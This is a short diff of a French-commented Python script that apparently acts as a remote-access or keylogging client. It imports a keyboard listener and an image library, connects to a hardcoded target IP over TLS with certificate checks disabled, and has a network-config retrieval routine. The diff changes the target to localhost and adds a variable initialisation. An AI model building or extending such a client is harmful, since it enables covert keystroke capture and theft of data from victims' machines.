@@ -3,11 +3,12 @@ from pynput import keyboard
 from PIL import Image
 
 # --- PARAMÈTRES RÉSEAU ---
-CIBLE_IP = "192.168.2.4" #
+CIBLE_IP = "127.0.0.1" #
 CIBLE_PORT = 12345 #
 
 def initialisation_flux():
     """Gère la connexion sécurisée et la boucle d'écoute"""
+    connexion_brute = None
     reglages = ssl.create_default_context()
     reglages.check_hostname = False
     reglages.verify_mode = ssl.CERT_NONE #
@@ -90,4 +91,4 @@ def recuperer_configs_reseau():
         return "Erreur acces"
 
 if __name__ == "__main__":
-    initialisation_flux()
+    initialisation_flux()
